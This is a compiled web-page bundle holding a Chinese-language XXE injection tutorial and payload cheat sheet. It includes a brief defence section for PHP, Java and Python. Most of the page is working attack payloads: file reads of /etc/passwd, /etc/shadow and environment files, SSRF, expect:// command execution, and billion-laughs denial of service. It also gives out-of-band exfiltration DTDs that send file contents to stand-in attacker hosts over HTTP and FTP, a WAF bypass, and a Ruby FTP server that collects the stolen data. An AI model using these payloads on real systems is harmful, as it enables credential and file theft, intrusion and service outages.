*"}),(0,t.jsx)(n.td,{style:{textAlign:"center"}})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"}}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"phar"}),(0,t.jsx)(n.td,{style:{textAlign:"center"}}),(0,t.jsx)(n.td,{style:{textAlign:"center"}})]})]})]}),"\n",(0,t.jsx)(n.p,{children:"\u8fd9\u91cc\u53ea\u4ecb\u7ecd\u57fa\u7840\u7684\u5e26\u56de\u663e\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u4e0d\u5e26\u56de\u663e\u7684\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684Payload"}),"\n",(0,t.jsx)(n.h3,{id:"\u8bfb\u53d6\u6587\u4ef6",children:"\u8bfb\u53d6\u6587\u4ef6"}),"\n",(0,t.jsxs)(n.p,{children:["\u8bfb\u53d6",(0,t.jsx)(n.code,{children:"/etc/passwd"}),"\uff0c\u8fd9\u4e2a\u660e\u663e\u662f\u7ed9",(0,t.jsx)(n.code,{children:"file///etc/passwd"}),"\u7684\u503c\u8d4b\u503c\u7ed9",(0,t.jsx)(n.code,{children:"name"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE userInfo [\n        <!ELEMENT userInfo (name)>\n        <!ELEMENT name (#PCDATA)>\n        <!ENTITY name SYSTEM "file:///etc/passwd">\n        ]>\n\n<userInfo>\n    <name>&name;</name>\n</userInfo>\n'})}),"\n",(0,t.jsx)(n.h3,{id:"ssrf",children:"SSRF"}),"\n",(0,t.jsx)(n.p,{children:"\u7b80\u5355\u7684\u53d1\u8d77http\u8bf7\u6c42\uff0c\u6839\u636e\u7ed3\u679c\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE userInfo [\n        <!ELEMENT userInfo (name)>\n        <!ELEMENT name (#PCDATA)>\n        <!ENTITY name SYSTEM "http://baidu.aaaa">\n        ]>\n\n<userInfo>\n    <name>&name;</name>\n</userInfo>\n'})}),"\n",(0,t.jsx)(n.h3,{id:"\u6267\u884c\u7cfb\u7edf\u547d\u4ee4",children:"\u6267\u884c\u7cfb\u7edf\u547d\u4ee4"}),"\n",(0,t.jsxs)(n.p,{children:["\u6bd4\u8f83\u9e21\u808b\uff0c\u6bd4\u8f83\u96be\u5229\u7528\uff0c\u8981\u5728\u5b89\u88c5",(0,t.jsx)(n.code,{children:"expect"}),"\u6269\u5c55\u7684",(0,t.jsx)(n.code,{children:"PHP\u73af\u5883"}),"\u91cc\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5176\u4ed6\u534f\u8bae\u4e5f\u6709\u53ef\u80fd\u5427"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM "expect://id" >]>\n<root>\n<name>&xxe;</name>\n</root>\n'})}),"\n",(0,t.jsx)(n.h3,{id:"\u62d2\u7edd\u670d\u52a1\u653b\u51fb",children:"\u62d2\u7edd\u670d\u52a1\u653b\u51fb"}),"\n",(0,t.jsx)(n.p,{children:"\u9012\u5f52\u5f15\u7528\uff0clol \u5b9e\u4f53\u5177\u4f53\u8fd8\u6709 \u201clol\u201d \u5b57\u7b26\u4e32\uff0c\u7136\u540e\u4e00\u4e2a lol2 \u5b9e\u4f53\u5f15\u7528\u4e86 10 \u6b21 lol \u5b9e\u4f53\uff0c\u4e00\u4e2a lol3 \u5b9e\u4f53\u5f15\u7528\u4e86 10 \u6b21 lol2 \u5b9e\u4f53\uff0c\u6b64\u65f6\u4e00\u4e2a lol3 \u5b9e\u4f53\u5c31\u542b\u6709 10^2 \u4e2a \u201clol\u201d \u4e86\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0clol9 \u5b9e\u4f53\u542b\u6709 10^8 \u4e2a \u201clol\u201d \u5b57\u7b26\u4e32,\u6700\u540e\u518d\u5f15\u7528lol9\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0"?>\n   <!DOCTYPE lolz [\n<!ENTITY lol "lol">\n<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n]>\n<lolz>&lol9;</lolz>\n'})}),"\n",(0,t.jsx)(n.h2,{id:"xinclude\u653b\u51fb",children:"XInclude\u653b\u51fb"}),"\n",(0,t.jsxs)(n.p,{children:["\u4e00\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u80fd\u65e0\u6cd5\u63a7\u5236\u6574\u4e2aXML\u6587\u6863\uff0c\u4e5f\u5c31\u65e0\u6cd5\u5b8c\u5168XXE\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u5176\u4e2d\u4e00\u90e8\u5206\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u53ef\u4ee5\u4f7f\u7528",(0,t.jsx)(n.code,{children:"XInclude"})]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"XInclude"}),"\u662fXML\u89c4\u8303\u7684\u4e00\u90e8\u5206\uff0c\u5b83\u5141\u8bb8\u4ece\u5b50\u6587\u6863\u6784\u5efaXML\u6587\u6863\u3002\u53ef\u4ee5\u5728XML\u6587\u6863\u4e2d\u7684\u4efb\u4f55\u6570\u636e\u503c\u4e2d\u653e\u7f6e",(0,t.jsx)(n.code,{children:"XInclude Payload"})]}),"\n",(0,t.jsxs)(n.p,{children:["\u8981\u6267\u884c",(0,t.jsx)(n.code,{children:"XInclude"}),"\u653b\u51fb\uff0c\u9700\u8981\u5f15\u7528",(0,t.jsx)(n.code,{children:"XInclude"}),"\u547d\u540d\u7a7a\u95f4\u5e76\u63d0\u4f9b\u8981\u5305\u542b\u7684\u6587\u4ef6\u7684\u8def\u5f84\u3002\u4f8b\u5982\uff1a"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n<xi:include parse="text" href="file:///etc/passwd"/></foo>\n'})}),"\n",(0,t.jsx)(n.h2,{id:"\u54ea\u4e9b\u5730\u65b9\u53ef\u80fd\u5b58\u5728xxe",children:"\u54ea\u4e9b\u5730\u65b9\u53ef\u80fd\u5b58\u5728XXE"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"\u5141\u8bb8\u4e0a\u4f20XML\u6587\u4ef6\u7684\u5730\u65b9"}),"\n",(0,t.jsx)(n.li,{children:"\u5141\u8bb8\u4e0a\u4f20Excel\u3001Word\u3001SVG\u7b49\u6587\u4ef6\u7684\u5730\u65b9\uff08\u56e0\u4e3a\u8fd9\u4e9b\u6587\u4ef6\u672c\u8d28\u4e5f\u662fXML\uff09"}),"\n",(0,t.jsxs)(n.li,{children:["\u8bf7\u6c42\u4e2d",(0,t.jsx)(n.code,{children:"Content-Type"}),"\u5141\u8bb8\u4e3a",(0,t.jsx)(n.code,{children:"application/xml"}),"\u7684\u6570\u636e\u5305(\u53ef\u4ee5\u624b\u52a8\u4fee\u6539\uff0c\u6bd4\u5982\u5c06",(0,t.jsx)(n.code,{children:"application/json"}),"\u4e2d\u7684",(0,t.jsx)(n.code,{children:"json"}),"\u76f4\u63a5\u4fee\u6539\u4e3a",(0,t.jsx)(n.code,{children:"xml"}),")"]}),"\n",(0,t.jsx)(n.li,{children:"..."}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["\u603b\u800c\u8a00\u4e4b\u4e00\u53e5\u8bdd\uff1a",(0,t.jsx)(n.strong,{children:"\u6240\u6709\u80fd\u4f20\u80fd\u89e3\u6790XML\u6570\u636e\u7ed9\u670d\u52a1\u7aef\u7684\u5730\u65b9\uff0c\u90fd\u53ef\u80fd\u5b58\u5728XXE\u3002"})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9632\u5fa1",children:"\u9632\u5fa1"}),"\n",(0,t.jsx)(n.p,{children:"1\u3001\u4f7f\u7528\u5f00\u53d1\u8bed\u8a00\u63d0\u4f9b\u7684\u7981\u7528\u5916\u90e8\u5b9e\u4f53\u7684\u65b9\u6cd5"}),"\n",(0,t.jsx)(n.p,{children:"\u4e0d\u540c\u7684\u7c7b\u53ef\u80fd\u8bbe\u7f6e\u65b9\u6cd5\u4e5f\u4e0d\u4e00\u6837\uff0c\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\u3002"}),"\n",(0,t.jsx)(n.p,{children:"php:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",children:"libxml_disable_entity_loader(true);\n"})}),"\n",(0,t.jsx)(n.p,{children:"java:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'SAXReader saxReader = new SAXReader();\nsaxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\n'})}),"\n",(0,t.jsx)(n.p,{children:"Python:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"from lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n"})}),"\n",(0,t.jsx)(n.p,{children:"2\u3001\u8fc7\u6ee4\u7528\u6237\u63d0\u4ea4\u7684XML\u6570\u636e"}),"\n",(0,t.jsxs)(n.p,{children:["\u8fc7\u6ee4\u5173\u952e\u5b57\uff1a",(0,t.jsx)(n.code,{children:"<\\!DOCTYPE"}),"\u548c",(0,t.jsx)(n.code,{children:"<\\!ENTITY"}),"\uff0c\u6216\u8005",(0,t.jsx)(n.code,{children:"SYSTEM"}),"\u548c",(0,t.jsx)(n.code,{children:"PUBLIC"}),"\u3002"]}),"\n",(0,t.jsx)(n.p,{children:"3\u3001\u4e0d\u5141\u8bb8XML\u4e2d\u542b\u6709\u81ea\u5df1\u5b9a\u4e49\u7684DTD"}),"\n",(0,t.jsx)(n.h2,{id:"payload",children:"Payload"}),"\n",(0,t.jsx)(n.h3,{id:"basic",children:"Basic"}),"\n",(0,t.jsx)(n.h4,{id:"basic-xml-example",children:"Basic XML Example"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'\x3c!--?xml version="1.0" ?--\x3e\n<userInfo>\n <firstName>John</firstName>\n <lastName>Doe</lastName>\n</userInfo>\n'})}),"\n",(0,t.jsx)(n.h4,{id:"entity-example",children:"Entity Example"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'\x3c!--?xml version="1.0" ?--\x3e\n<!DOCTYPE replace [<!ENTITY example "Doe"> ]>\n <userInfo>\n  <firstName>John</firstName>\n  <lastName>&example;</lastName>\n </userInfo>\n'})}),"\n",(0,t.jsx)(n.h3,{id:"inband-injection",children:"Inband Injection"}),"\n",(0,t.jsx)(n.h4,{id:"extract-data-from-the-server",children:"Extract data from the server"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ELEMENT data (#ANY)>\n<!ENTITY file SYSTEM "file:///etc/passwd">\n]>\n<data>&file;</data>\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="ISO-8859-1"?>\n  <!DOCTYPE foo [  \n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="ISO-8859-1"?>\n<!DOCTYPE foo [  \n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>\n'})}),"\n",(0,t.jsx)(n.h4,{id:"xxe-base64-encoded",children:"XXE Base64 encoded"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!DOCTYPE test [\n    <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> \n    %init;\n    ]>\n<foo/>\n'})}),"\n",(0,t.jsx)(n.h4,{id:"php-wrapper-inside-xxe",children:"PHP Wrapper inside XXE"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>\n<contacts>\n  <contact>\n    <name>Jean &xxe; Dupont</name>\n    <phone>00 11 22 33 44</phone>\n    <adress>42 rue du CTF</adress>\n    <zipcode>75000</zipcode>\n    <city>Paris</city>\n  </contact>\n</contacts>\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="ISO-8859-1"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://attacker.com/file.php" >\n]>\n<foo>&xxe;</foo>\n'})}),"\n",(0,t.jsx)(n.h3,{id:"oob-injection",children:"OOB Injection"}),"\n",(0,t.jsx)(n.h4,{id:"vanilla-used-to-verify-outbound-xxe-or-blind-xxe",children:"Vanilla, used to verify outbound xxe or blind xxe"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">\n]>\n<r>&sp;</r>\n'})}),"\n",(0,t.jsx)(n.h4,{id:"oob-extraction1",children:"OoB extraction1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"\u5916\u90e8\u5b9e\u4f53"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://x.x.x.x:443/?%data;\'>">\n'})}),"\n",(0,t.jsx)(n.h4,{id:"oob-variation-of-above-seems-to-work-better-against-net",children:"OoB variation of above (seems to work better against .NET)"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">\n%sp;\n%param1;\n%exfil;\n]>\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"\u5916\u90e8\u5b9e\u4f53"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">\n<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://x.x.x.x:443/?%data;\'>">\n'})}),"\n",(0,t.jsx)(n.h4,{id:"oob-extraction2",children:"OoB extraction2"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE r [\n<!ENTITY % data3 SYSTEM "file:///etc/shadow">\n<!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd">\n%sp;\n%param3;\n%exfil;\n]>\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"External dtd"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:"<!ENTITY % param3 \"<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>\">\n"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"ftp server"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb",children:"https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb"})}),"\n",(0,t.jsx)(n.h4,{id:"oob-extra-error----java",children:"OoB extra ERROR -- Java"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE r [\n<!ENTITY % data3 SYSTEM "file:///etc/passwd">\n<!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd">\n%sp;\n%param3;\n%exfil;\n]>\n<r></r>\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"External dtd"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:"<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM \"file:///nothere/%payload;\">'> %param1; %external;\n"})}),"\n",(0,t.jsx)(n.h4,{id:"oob-xxe-base64----php",children:"OoB XXE Base64 -- PHP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!DOCTYPE convert [\n<!ENTITY % remote SYSTEM "http://xx.xx.xx.xx:8080/config.dtd">\n%remote;%int;%send;\n]>\n\n\n\x3c!-- config.dtd\u7684\u5185\u5bb9 --\x3e\n<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">\n<!ENTITY % int "<!ENTITY &#37; send SYSTEM \'http://xx.xx.xx.xx:8080/index.php?flag=%file;\'>">\n'})}),"\n",(0,t.jsx)(n.h4,{id:"oob-extra-nice",children:"OoB extra nice"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE root [\n <!ENTITY % start "<![CDATA[">\n <!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">\n<!ENTITY % end "]]>">\n<!ENTITY % dtd SYSTEM "http://evil/evil.xml">\n%dtd;\n]>\n<root>&all;</root>\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"External dtd"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!ENTITY all "%start;%stuff;%end;">\n'})}),"\n",(0,t.jsx)(n.h4,{id:"file-not-found-exception-based-extraction",children:"File-not-found exception based extraction"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE test [  \n  <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >\n  %one;\n  %two;\n  %four;\n]>\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"External dtd"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!ENTITY % three SYSTEM "file:///etc/passwd">\n<!ENTITY % two "<!ENTITY % four SYSTEM \'file:///%three;\'>">\n\x3c!-- you might need to encode this % (depends on your target) as: &#x25; --\x3e\n'})}),"\n",(0,t.jsx)(n.h4,{id:"ftp",children:"FTP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" ?>\n<!DOCTYPE a [ \n<!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd">\n%asd;\n%c;\n]>\n<a>&rrr;</a>\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"External dtd"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!ENTITY % d SYSTEM "file:///proc/self/environ">\n<!ENTITY % c "<!ENTITY rrr SYSTEM \'ftp://x.x.x.x:2121/%d;\'>">\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"FTP Server"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb",children:"https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb"})}),"\n",(0,t.jsx)(n.h4,{id:"inside-soap-body",children:"Inside SOAP body"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<soap:Body>\n  <foo>\n    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>\n  </foo>\n</soap:Body>\n'})}),"\n",(0,t.jsx)(n.h4,{id:"xxe-inside-svg",children:"XXE inside SVG"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">\n    <image xlink:href="expect://ls"></image>\n</svg>\n'})}),"\n",(0,t.jsx)(n.h4,{id:"untested---waf-bypass",children:"Untested - WAF Bypass"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!DOCTYPE :. SYTEM "http://"\n<!DOCTYPE :_-_: SYTEM "http://"\n<!DOCTYPE {0xdfbf} SYSTEM "http://"\n'})}),"\n",(0,t.jsx)(n.h3,{id:"dos",children:"DOS"}),"\n",(0,t.jsx)(n.h4,{id:"\u5305\u62ec\u4e00\u4e2a\u968f\u673a\u7684\u6587\u4ef6",children:"\u5305\u62ec\u4e00\u4e2a\u968f\u673a\u7684\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!ENTITY xxe SYSTEM "file:///dev/random" >]>\n'})}),"\n",(0,t.jsx)(n.h4,{id:"billion-laugh-attack---denial-of-service",children:"Billion Laugh Attack - Denial Of Service"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'\x3c!--?xml version="1.0" ?--\x3e\n<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>\n<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;\n<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n<tag>&lol9;</tag>\n'})}),"\n",(0,t.jsx)(n.h2,{id:"ftp-server\u4ee3\u7801\u5907\u4efd",children:"FTP Server\u4ee3\u7801\u5907\u4efd"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"xxe-ftp-server.rb"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-ruby",children:'require \'socket\'\n\nftp_server = TCPServer.new 2121\nhttp_server = TCPServer.new 8088\n\nlog = File.open( "xxe-ftp.log", "a")\n\npayload = \'<!ENTITY % asd SYSTEM "file:///etc/passwd">\'\n\nThread.start do\nloop do\n  Thread.start(http_server.accept) do |http_client|\n\tputs "HTTP. New client connected" \n\tloop {\n\t\treq = http_client.gets()\n\t\tbreak if req.nil?\n\t\tif req.start_with? "GET"\n\t\t\thttp_client.puts("HTTP/1.1 200 OK\\r\\nContent-length: #{payload.length}\\r\\n\\r\\n#{payload}")\t\n\t\tend\n\t\tputs req\n\t}  \n\tputs "HTTP. Connection closed" \n  end\nend\n\nend\n\nThread.start do\nloop do\n  Thread.start(ftp_server.accept) do |ftp_client|\n\tputs "FTP. New client connected"\n\tftp_client.puts("220 xxe-ftp-server")\n\tloop {\n\t\treq = ftp_client.gets()\n\t\tbreak if req.nil?\n\t\tputs "< "+req\n\t\tlog.write "get req: #{req.inspect}\\n"\n\t\t\n\t\tif req.include? "LIST"\n\t\t\tftp_client.puts("drwxrwxrwx 1 owner group          1 Feb 21 04:37 test")\n\t\t\tftp_client.puts("150 Opening BINARY mode data connection for /bin/ls")\n\t\t\tftp_client.puts("226 Transfer complete.")\n\t\telsif req.include? "USER"\n\t\t\tftp_client.puts("331 password please - version check")\n\t\telsif req.include? "PORT"\n\t\t\tputs "! PORT received"\n\t\t\tputs "> 200 PORT command ok"\n\t\t\tftp_client.puts("200 PORT command ok")\n\t\telse\n\t\t\tputs "> 230 more data please!"\n\t\t\tftp_client.puts("230 more data please!")\n\t\tend\n\t}\n\tputs "FTP. Connection closed" \n  end\nend\nend\n\nloop do\n\tsleep(10000)\nend\n\n'})}),"\n",(0,t.jsx)(n.h2,{id:"\u53c2\u8003\u6587\u7ae0",children:"\u53c2\u8003\u6587\u7ae0"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.a,{href:"https://xz.aliyun.com/t/6887",children:"\u4eceXML\u76f8\u5173\u4e00\u6b65\u4e00\u6b65\u5230XXE\u6f0f\u6d1e"})}),"\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.a,{href:"https://portswigger.net/web-security/xxe",children:"xxe"})}),"\n"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.a,{href:"https://github.com/payloadbox/xxe-injection-payload-list",children:"XML External Entity (XXE) Injection Payload List"})}),"\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.a,{href:"https://gist.github.com/staaldraad/01415b990939494879b4",children:"XXE_payloads"})}),"\n"]})]})}function a(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(x,{...e})}):x(e)}},21566:(e,n,l)=>{l.d(n,{A:()=>s});const s=l.p+"assets/images/xxe-injection-095de8dac74bb01b8330b7efd3a08ba3.svg"},28453:(e,n,l)=>{l.d(n,{R:()=>d,x:()=>r});var s=l(96540);const t={},i=s.createContext(t);function d(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:d(e.components),s.createElement(i.Provider,{value:n},e.children)}},83633:(e,n,l)=>{l.d(n,{A:()=>s});const s=l.p+"assets/images/image-20211104141555074-45cec2f5c4f8d8d75ec052d9a0a7e1f7.png"}}]);